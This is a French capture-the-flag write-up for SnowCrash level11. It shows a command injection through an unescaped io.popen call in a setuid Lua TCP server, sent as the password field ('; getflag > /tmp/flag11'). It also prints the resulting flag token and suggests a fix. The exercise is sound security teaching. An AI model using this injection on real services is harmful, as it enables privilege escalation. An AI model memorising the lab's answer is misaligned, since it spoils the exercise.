# README - Exploitation du script level11.lua

## Étapes suivies pour obtenir le Flag11

### 1. Identification des fichiers

Le répertoire contient un fichier principal :

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

- **`level11.lua`** : Un script Lua exécutable avec permissions `setuid` et `setgid`, s'exécutant avec les privilèges de l'utilisateur `flag11`. Il implémente un serveur TCP simple.

### 2. Analyse du script `level11.lua`

En lisant le script avec `cat level11.lua`, on observe :

- Il crée un serveur TCP sur `127.0.0.1:5151` et attend une entrée utilisateur (`pass`).
- La fonction `hash(pass)` exécute : `io.popen("echo "..pass.." | sha1sum", "r")` pour hacher le mot de passe et le comparer à `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`.
- Le serveur tourne déjà en arrière-plan avec les droits de `flag11` (vérifiable avec `netstat -tlnp | grep 5151`).

Test simple :
```bash
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

### 3. Exploitation de la vulnérabilité

La vulnérabilité est une injection de commande dans `io.popen`, car `pass` est concaténé directement sans échappement. On peut injecter une commande après un `;` (séparateur shell).

- Le serveur a les privilèges de `flag11`, donc on exécute `getflag` pour capturer son output.

### 4. Injection de commande

Connecte-toi au serveur et injecte :
```bash
nc localhost 5151
Password: ; getflag > /tmp/flag11
Erf nope..
```

Lis le résultat :
```bash
cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

### 5. Passage à l'utilisateur suivant

Utilise le mot de passe récupéré pour passer directement à `level12` :

```bash
level11@SnowCrash:~$ su level12
Password: fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$
```

### Vulnérabilité expliquée

Le script Lua utilise `io.popen` pour exécuter une commande shell avec l'input utilisateur non sanitizé : `"echo "..pass.." | sha1sum"`. En injectant `; commande_malveillante`, le shell exécute la commande supplémentaire. Les permissions `setuid/setgid` élèvent les privilèges à `flag11`, permettant d'exécuter `getflag`. Une correction impliquerait d'échapper l'input (ex. : quotes) ou d'éviter `popen` pour du hashing (utiliser une lib Lua native comme LuaSHA).
